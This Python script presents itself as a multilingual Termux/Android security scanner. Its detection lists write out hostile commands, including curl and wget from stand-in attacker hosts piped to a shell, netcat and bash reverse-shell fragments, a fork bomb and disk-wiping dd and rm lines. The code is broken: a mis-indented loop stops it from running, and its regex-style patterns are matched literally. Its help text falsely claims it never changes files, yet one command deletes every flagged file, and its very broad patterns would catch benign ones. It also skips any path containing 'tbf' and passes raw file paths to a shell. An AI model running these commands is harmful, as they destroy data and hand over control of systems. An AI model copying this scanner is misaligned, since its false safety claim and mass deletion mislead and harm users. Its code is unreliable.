#!/usr/bin/env python3
# ============================================
#   TBFPUMBA-SckanerOp v7.0 (PRO UI)
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

import os
import sys
import time
import subprocess
import json
from datetime import datetime
import pyfiglet

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme

# Настраиваем неоновые киберпанк стили для Rich
custom_theme = Theme({
    "accent": "bold bright_cyan",
    "danger": "bold red",
    "warning": "bold yellow",
    "success": "bold green",
    "info": "bold blue",
    "dim_text": "dim white",
    "title": "bold magenta"
})

console = Console(theme=custom_theme)

# Файл для сохранения настроек
CONFIG_FILE = os.path.expanduser("~/.tbfpumba_config.json")

# ============================================
#   МОВНІ ПАКЕТИ / ЯЗЫКОВЫЕ ПАКЕТЫ
# ============================================
LANG = {
    "uk": {
        "app_name": "TBFPUMBA - SCAN",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "Ініціалізація сканера...",
        "ready": "Готово!",
        "choose_folder": "📂 Виберіть папку для сканування:",
        "opt_termux": "1. Termux (за замовчуванням)",
        "opt_phone": "2. Весь телефон (/storage/emulated/0)",
        "opt_custom": "3. Ввести свій шлях",
        "enter_choice": "Виберіть (1/2/3): ",
        "enter_path": "Введіть шлях: ",
        "invalid_path": "Шлях не існує! Використовую Termux.",
        "invalid_choice": "Невірний вибір. Використовую Termux.",
        "selected": "Обрано: ",
        "scan_confirm": "Запустити сканування? (y/n/help/TBF++): ",
        "scan_cancel": "Сканування скасовано.",
        "scanning": "Сканування папки: ",
        "scan_result_title": "🔍 РЕЗУЛЬТАТИ СКАНУВАННЯ",
        "critical_title": "🔴 КРИТИЧНІ ЗАГРОЗИ:",
        "suspicious_title": "🟡 ПІДОЗРІЛІ ФАЙЛИ:",
        "found": "🔒 Знайдено: {0} підозрілих файлів.",
        "deleted": "Видалено: {0}",
        "delete_fail": "Не вдалося видалити: {0}",
        "delete_confirm": "⚠️ ВИДАЛЕННЯ ЗАГРОЗ! Буде видалено {0} файлів. Впевнені? (y/n): ",
        "delete_cancel": "Видалення скасовано.",
        "no_threats": "Підозрілих файлів не знайдено.",
        "clean": "Підозрілих файлів не знайдено. Ваша система чиста!",
        "scan_done": "⏱️ Час сканування: {0:.2f} секунд",
        "delete_hint": "💡 Для видалення всіх загроз введіть: -TBF",
        "lang_choose": "🌍 Оберіть мову:",
        "lang_uk": "1. Українська",
        "lang_ru": "2. Русский",
        "lang_en": "3. English",
        "lang_saved": "Мову збережено! Перезапустіть сканер.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Довідка",
        "help_about": "🛡️ Про програму:",
        "help_about_text": "  Потужний сканер безпеки для виявлення",
        "help_about_text2": "  та ВИДАЛЕННЯ підозрілих та критичних загроз.",
        "help_usage": "🚀 Як запустити:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /шлях/до/папки",
        "help_cmds": "⚙️ Команди:",
        "help_cmd_help": "  help   — показати це керівництво",
        "help_cmd_y": "  y      — запустити сканування",
        "help_cmd_tbf": "  TBF++  — змінити мову",
        "help_cmd_n": "  n      — вийти",
        "help_what_scan": "📂 Що сканується:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk файли (аналіз назви, дозволів, розміру)",
        "help_what_scan_text3": "  - .bin, .exe (за назвою та сигнатурами)",
        "help_levels": "🔴 Рівні загроз:",
        "help_levels_text": "  🔴 Критична — може пошкодити систему",
        "help_levels_text2": "  🟡 Підозріла — потребує перевірки",
        "help_safety": "🔒 Безпека:",
        "help_safety_text": "  Сканер не змінює файли, тільки аналізує.",
        "help_exit": "Натисніть Enter, щоб закрити довідку...",
        "cmd_not_found": "Введіть 'y', 'n', 'help' або 'TBF++'.",
        "unknown_cmd": "Для виходу натисніть Enter або введіть -TBF для видалення: ",
        "exit_msg": "👋 Дякуємо, що використовуєте TBFPUMBA-SckanerOp!"
    },
    "ru": {
        "app_name": "TBFPUMBA - SCAN",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "Инициализация сканера...",
        "ready": "Готово!",
        "choose_folder": "📂 Выберите папку для сканирования:",
        "opt_termux": "1. Termux (по умолчанию)",
        "opt_phone": "2. Весь телефон (/storage/emulated/0)",
        "opt_custom": "3. Ввести свой путь",
        "enter_choice": "Выберите (1/2/3): ",
        "enter_path": "Введите путь: ",
        "invalid_path": "Путь не существует! Использую Termux.",
        "invalid_choice": "Неверный выбор. Использую Termux.",
        "selected": "Выбрано: ",
        "scan_confirm": "Запустить сканирование? (y/n/help/TBF++): ",
        "scan_cancel": "Сканирование отменено.",
        "scanning": "Сканирование папки: ",
        "scan_result_title": "🔍 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ",
        "critical_title": "🔴 КРИТИЧЕСКИЕ УГРОЗЫ:",
        "suspicious_title": "🟡 ПОДОЗРИТЕЛЬНЫЕ ФАЙЛЫ:",
        "found": "🔒 Найдено: {0} подозрительных файлов.",
        "deleted": "Удалено: {0}",
        "delete_fail": "Не удалось удалить: {0}",
        "delete_confirm": "⚠️ УДАЛЕНИЕ УГРОЗ! Будет удалено {0} файлов. Уверены? (y/n): ",
        "delete_cancel": "Удаление отменено.",
        "no_threats": "Подозрительных файлов не найдено.",
        "clean": "Подозрительных файлов не найдено. Ваша система чиста!",
        "scan_done": "⏱️ Время сканирования: {0:.2f} секунд",
        "delete_hint": "💡 Для удаления всех угроз введите: -TBF",
        "lang_choose": "🌍 Выберите язык:",
        "lang_uk": "1. Українська",
        "lang_ru": "2. Русский",
        "lang_en": "3. English",
        "lang_saved": "Язык сохранен! Перезапустите сканер.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Справка",
        "help_about": "🛡️ О программе:",
        "help_about_text": "  Мощный сканер безопасности для обнаружения",
        "help_about_text2": "  и УДАЛЕНИЯ подозрительных и критических угроз.",
        "help_usage": "🚀 Как запустить:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /путь/к/папке",
        "help_cmds": "⚙️ Команды:",
        "help_cmd_help": "  help   — показать это руководство",
        "help_cmd_y": "  y      — запустить сканирование",
        "help_cmd_tbf": "  TBF++  — изменить язык",
        "help_cmd_n": "  n      — выйти",
        "help_what_scan": "📂 Что сканируется:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk файлы (анализ названия, разрешений, размера)",
        "help_what_scan_text3": "  - .bin, .exe (по названию и сигнатурам)",
        "help_levels": "🔴 Уровни угроз:",
        "help_levels_text": "  🔴 Критическая — может повредить систему",
        "help_levels_text2": "  🟡 Подозрительная — требует проверки",
        "help_safety": "🔒 Безопасность:",
        "help_safety_text": "  Сканер не изменяет файлы, только анализирует.",
        "help_exit": "Нажмите Enter, чтобы закрыть справку...",
        "cmd_not_found": "Введите 'y', 'n', 'help' или 'TBF++'.",
        "unknown_cmd": "Для выхода нажмите Enter или введите -TBF для удаления: ",
        "exit_msg": "👋 Спасибо, что используете TBFPUMBA-SckanerOp!"
    },
    "en": {
        "app_name": "TBFPUMBA - SCAN",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "Initializing scanner...",
        "ready": "Ready!",
        "choose_folder": "📂 Choose folder to scan:",
        "opt_termux": "1. Termux (default)",
        "opt_phone": "2. Whole phone (/storage/emulated/0)",
        "opt_custom": "3. Enter custom path",
        "enter_choice": "Choose (1/2/3): ",
        "enter_path": "Enter path: ",
        "invalid_path": "Path doesn't exist! Using Termux.",
        "invalid_choice": "Invalid choice. Using Termux.",
        "selected": "Selected: ",
        "scan_confirm": "Start scanning? (y/n/help/TBF++): ",
        "scan_cancel": "Scanning cancelled.",
        "scanning": "Scanning folder: ",
        "scan_result_title": "🔍 SCAN RESULTS",
        "critical_title": "🔴 CRITICAL THREATS:",
        "suspicious_title": "🟡 SUSPICIOUS FILES:",
        "found": "🔒 Found: {0} suspicious files.",
        "deleted": "Deleted: {0}",
        "delete_fail": "Failed to delete: {0}",
        "delete_confirm": "⚠️ DELETE THREATS! {0} files will be deleted. Are you sure? (y/n): ",
        "delete_cancel": "Deletion cancelled.",
        "no_threats": "No suspicious files found.",
        "clean": "No suspicious files found. Your system is clean!",
        "scan_done": "⏱️ Scan time: {0:.2f} seconds",
        "delete_hint": "💡 To delete all threats enter: -TBF",
        "lang_choose": "🌍 Choose language:",
        "lang_uk": "1. Українська",
        "lang_ru": "2. Русский",
        "lang_en": "3. English",
        "lang_saved": "Language saved! Restart the scanner.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Help",
        "help_about": "🛡️ About:",
        "help_about_text": "  Powerful security scanner for detecting",
        "help_about_text2": "  and REMOVING suspicious and critical threats.",
        "help_usage": "🚀 How to run:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /path/to/folder",
        "help_cmds": "⚙️ Commands:",
        "help_cmd_help": "  help   — show this help",
        "help_cmd_y": "  y      — start scanning",
        "help_cmd_tbf": "  TBF++  — change language",
        "help_cmd_n": "  n      — exit",
        "help_what_scan": "📂 What is scanned:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk files (name, permissions, size)",
        "help_what_scan_text3": "  - .bin, .exe (by name and signatures)",
        "help_levels": "🔴 Threat levels:",
        "help_levels_text": "  🔴 Critical — can damage the system",
        "help_levels_text2": "  🟡 Suspicious — requires checking",
        "help_safety": "🔒 Safety:",
        "help_safety_text": "  Scanner does not change files, only analyzes.",
        "help_exit": "Press Enter to close help...",
        "cmd_not_found": "Enter 'y', 'n', 'help' or 'TBF++'.",
        "unknown_cmd": "Press Enter to exit or enter -TBF to delete: ",
        "exit_msg": "👋 Thank you for using TBFPUMBA-SckanerOp!"
    }
}

# ============================================
#   ФУНКЦІЇ РОБОТИ З МОВОЮ
# ============================================
def load_lang():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                return config.get('lang', 'uk')
        except Exception:
            return 'uk'
    else:
        return choose_language()

def save_lang(lang):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({'lang': lang}, f)

def choose_language():
    console.clear()
    console.print("[accent]🌍 Choose language / Оберіть мову / Выберите язык:[/accent]")
    console.print("  [success]1. Українська[/success]")
    console.print("  [success]2. Русский[/success]")
    console.print("  [success]3. English[/success]")
    
    choice = input("\n👉 ").strip()
    
    if choice == '1':
        return 'uk'
    elif choice == '2':
        return 'ru'
    elif choice == '3':
        return 'en'
    else:
        console.print("[warning]⚠️ Невірний вибір. Використовую Українську.[/warning]")
        return 'uk'

def change_language():
    new_lang = choose_language()
    save_lang(new_lang)
    console.clear()
    console.print(f"[success]{LANG[new_lang]['lang_saved']}[/success]")
    sys.exit(0)

# ============================================
#   ОСНОВНІ ФУНКЦІЇ СКАНЕРА
# ============================================
def show_header(lang='uk'):
    console.clear()
    fig = pyfiglet.Figlet(font='slant')
    ascii_logo = fig.renderText(LANG[lang]['app_name'])
    console.print(Text(ascii_logo, style="accent"))

    panel_text = Text.assemble(
        (f"{LANG[lang]['app_by']}\n", "accent"),
        ("System Security Scanner & Threat Remover | ", "white"),
        ("GNU GPLv3", "dim_text")
    )
    console.print(Panel(panel_text, title="SYSTEM PROTECTION", border_style="bright_cyan", padding=(0, 1), expand=False))
    console.print()

def show_help(lang='uk'):
    console.clear()
    help_text = Text.assemble(
        (f"{LANG[lang]['help_about']}\n", "accent"),
        (f"{LANG[lang]['help_about_text']}\n{LANG[lang]['help_about_text2']}\n\n", "white"),
        (f"{LANG[lang]['help_usage']}\n", "accent"),
        (f"{LANG[lang]['help_usage_text']}\n{LANG[lang]['help_usage_text2']}\n\n", "white"),
        (f"{LANG[lang]['help_cmds']}\n", "accent"),
        (f"{LANG[lang]['help_cmd_help']}\n{LANG[lang]['help_cmd_y']}\n{LANG[lang]['help_cmd_tbf']}\n{LANG[lang]['help_cmd_n']}\n\n", "white"),
        (f"{LANG[lang]['help_what_scan']}\n", "accent"),
        (f"{LANG[lang]['help_what_scan_text']}\n{LANG[lang]['help_what_scan_text2']}\n{LANG[lang]['help_what_scan_text3']}\n\n", "white"),
        (f"{LANG[lang]['help_levels']}\n", "accent"),
        (f"{LANG[lang]['help_levels_text']}\n{LANG[lang]['help_levels_text2']}\n\n", "white"),
        (f"{LANG[lang]['help_safety']}\n", "accent"),
        (f"{LANG[lang]['help_safety_text']}", "white")
    )
    console.print(Panel(help_text, title=LANG[lang]['help_title'], border_style="bright_cyan"))
    input(f"\n{LANG[lang]['help_exit']}")

def delete_threats(threats, lang='uk'):
    if not threats:
        console.print(f"\n[success]{LANG[lang]['no_threats']}[/success]")
        return
    
    console.print(f"\n[danger]{LANG[lang]['delete_confirm'].format(len(threats))}[/danger]")
    answer = input(" 👉 ").lower()
    
    if answer in ['y', 'yes']:
        deleted = 0
        for filepath, level, msg in threats:
            try:
                os.remove(filepath)
                console.print(f"[success]✅ {LANG[lang]['deleted'].format(filepath)}[/success]")
                deleted += 1
            except Exception as e:
                console.print(f"[danger]❌ {LANG[lang]['delete_fail'].format(filepath)} ({e})[/danger]")
        console.print(f"\n[success]🔒 {LANG[lang]['deleted'].format(deleted)}[/success]")
    else:
        console.print(f"\n[warning]{LANG[lang]['delete_cancel']}[/warning]")

def choose_folder(lang='uk'):
    console.print(f"\n[accent]{LANG[lang]['choose_folder']}[/accent]")
    console.print(f"  [white]{LANG[lang]['opt_termux']}[/white]")
    console.print(f"  [white]{LANG[lang]['opt_phone']}[/white]")
    console.print(f"  [white]{LANG[lang]['opt_custom']}[/white]")
    
    choice = input(f"\n👉 {LANG[lang]['enter_choice']}").strip()
    
    if choice == "1":
        return os.path.expanduser("~")
    elif choice == "2":
        return "/storage/emulated/0"
    elif choice == "3":
        custom_path = input(f"👉 {LANG[lang]['enter_path']}").strip()
        if os.path.exists(custom_path):
            return custom_path
        else:
            console.print(f"[danger]{LANG[lang]['invalid_path']}[/danger]")
            return os.path.expanduser("~")
    else:
        console.print(f"[warning]{LANG[lang]['invalid_choice']}[/warning]")
        return os.path.expanduser("~")

def check_file_by_name(filepath):
    filename = os.path.basename(filepath).lower()
    suspicious_patterns = [
        "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
        "crypto", "miner", "steal", "fake", "clone", "spy", "track",
        "exploit", "payload", "backdoor", "trojan", "ransomware",
        "keylogger", "rootkit", "virus", "malware"
    ]
    for pattern in suspicious_patterns:
        if pattern in filename:
            return f"🟡 Підозріла назва: {pattern}"
    return None

def check_apk(filepath):
    results = []
    filename = os.path.basename(filepath).lower()
    try:
        size = os.path.getsize(filepath) // (1024 * 1024)
    except Exception:
        size = 0
    
    suspicious_patterns = [
        "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
        "crypto", "miner", "steal", "fake", "clone", "spy", "track",
        "exploit", "payload", "backdoor", "trojan", "ransomware",
        "keylogger", "rootkit", "virus", "malware"
    ]
    
    for pattern in suspicious_patterns:
        if pattern in filename:
            results.append(("🟡", f"Підозріла назва APK: {pattern}"))
            break
    
    if size > 0 and size < 0.5:
        results.append(("🟡", f"APK занадто малий: {size} МБ"))
    elif size > 100:
        results.append(("🟡", f"APK занадто великий: {size} МБ"))
    
    suspicious_permissions = [
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION"
    ]
    
    try:
        aapt_check = subprocess.getoutput("which aapt")
        if aapt_check:
            cmd = f"aapt dump permissions {filepath} 2>/dev/null"
            output = subprocess.getoutput(cmd)
            for perm in suspicious_permissions:
                if perm in output:
                    results.append(("🟡", f"Підозрілий дозвіл: {perm}"))
    except Exception:
        pass
    
    return results

def scan_file_content(filepath):
    suspicious_patterns = [
        "rm -rf", "format", "delete_all", "malware", "virus",
        "backdoor", "trojan", "rootkit", "keylogger", "ransomware",
        "cryptominer", "exploit", "payload", "shellcode", "reverse shell",
        "nc -e", "bash -i", "python -c", "perl -e", "curl.*|sh",
        "wget.*|bash", "eval", "exec", "system", "popen", "subprocess",
        "os.system", "os.popen", "subprocess.Popen", "subprocess.call",
        "open('", "read('", "write('", "chmod", "chown", "mount", "umount"
    ]
    
    high_risk_patterns = [
        "rm -rf --no-preserve-root",
        "dd if=/dev/zero of=/dev/block",
        "mkfs.ext4 /dev/block",
        "chmod 777 /system",
        "mount -o rw,remount /system",
        "curl http://malicious-site.com/install.sh | bash",
        "wget https://evil-domain.com/payload.sh | sh",
        "base64 -d | sh",
        "eval $(cat /dev/urandom | base64)",
        "iptables -F",
        "iptables -X",
        "killall -9",
        "pkill -f",
        ":(){ :|:& };:",
        "sudo rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
    ]
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            for pattern in high_risk_patterns:
                if pattern in content:
                    return "🔴", pattern
            for pattern in suspicious_patterns:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_file(filepath):
    results = []
    name_check = check_file_by_name(filepath)
    if name_check:
        results.append(("🟡", name_check))
    level, pattern = scan_file_content(filepath)
    if level:
        results.append((level, pattern))
    return results

def scan_folder(path, lang='uk'):
    suspicious_files = []
    files_to_scan = []
    
        for root, dirs, files in os.walk(path):
        dirs[:] = [d for d in dirs if 'tbf' not in d.lower()]
        for file in files:
            if 'tbf' in file.lower():
                continue
            files_to_scan.append(os.path.join(root, file))
            
    if not files_to_scan:
        return suspicious_files

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=25, style="info", complete_style="accent"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task(f"[cyan]{LANG[lang]['scanning']}", total=len(files_to_scan))

        for filepath in files_to_scan:
            file = os.path.basename(filepath)
            progress.update(task, advance=1, description=f"[cyan]Scanning: {file[:20]}")
            
            if filepath == os.path.realpath(__file__):
                continue
            
            if file.endswith('.apk'):
                apk_results = check_apk(filepath)
                for level, msg in apk_results:
                    suspicious_files.append((filepath, level, msg))
                continue
            
            if os.access(filepath, os.X_OK) and not file.endswith(('.txt', '.sh', '.py', '.js', '.md')):
                name_check = check_file_by_name(filepath)
                if name_check:
                    suspicious_files.append((filepath, "🟡", name_check))
            
            if file.endswith(('.txt', '.sh', '.py', '.js', '.c', '.cpp', '.bash', '.zsh', '.md', '.conf', '.cfg')):
                results = scan_file(filepath)
                for level, msg in results:
                    suspicious_files.append((filepath, level, msg))
    
    return suspicious_files

# ============================================
#   ГОЛОВНА ФУНКЦІЯ
# ============================================
if __name__ == "__main__":
    lang = load_lang()
    show_header(lang)
    
    if len(sys.argv) > 1:
        target_path = sys.argv[1]
        if os.path.exists(target_path):
            console.print(f"\n[accent]📂 Обрано шлях з аргументу: {target_path}[/accent]")
        else:
            console.print(f"[danger]{LANG[lang]['invalid_path']}[/danger]")
            target_path = os.path.expanduser("~")
    else:
        target_path = choose_folder(lang)
    
    console.print(f"\n[accent]{LANG[lang]['selected']}{target_path}[/accent]")
    
    while True:
        answer = input(f"\n👉 {LANG[lang]['scan_confirm']}").lower().strip()
        if answer in ['y', 'yes']:
            break
        elif answer in ['n', 'no']:
            console.print(f"[warning]{LANG[lang]['scan_cancel']}[/warning]")
            sys.exit()
        elif answer == 'help':
            show_help(lang)
            show_header(lang)
            continue
        elif answer == 'tbf++':
            change_language()
        else:
            console.print(f"[danger]❗ {LANG[lang]['cmd_not_found']}[/danger]")
    
    start_time = datetime.now()
    results = scan_folder(target_path, lang)
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    console.print("\n")
    
    if results:
        critical = [r for r in results if r[1] == "🔴"]
        suspicious = [r for r in results if r[1] == "🟡"]
        
        table = Table(
            title=f"{LANG[lang]['scan_result_title']}",
            header_style="accent",
            border_style="bright_cyan"
        )
        table.add_column("Level", justify="center")
        table.add_column("File Path", style="bold white")
        table.add_column("Details / Reason", style="yellow")

        for file, level, msg in critical:
            table.add_row("[danger]🔴 FAIL[/danger]", file, msg)
        for file, level, msg in suspicious:
            table.add_row("[warning]🟡 WARN[/warning]", file, msg)

        console.print(table)
        console.print(f"\n[info]{LANG[lang]['found'].format(len(results))}[/info]")
        console.print(f"[accent]{LANG[lang]['delete_hint']}[/accent]")
        threats = results
    else:
        console.print(f"[success]✅ {LANG[lang]['clean']}[/success]")
        threats = []
    
    console.print(f"\n[dim_text]{LANG[lang]['scan_done'].format(duration)}[/dim_text]")
    
    while True:
        cmd = input(f"\n👉 {LANG[lang]['unknown_cmd']}").strip()
        if cmd == '-TBF':
            delete_threats(threats, lang)
            sys.exit()
        elif cmd == '':
            console.print(f"[success]{LANG[lang]['exit_msg']}[/success]")
            sys.exit()
        else:
            console.print(f"[warning]❌ Невідома команда.[/warning]")
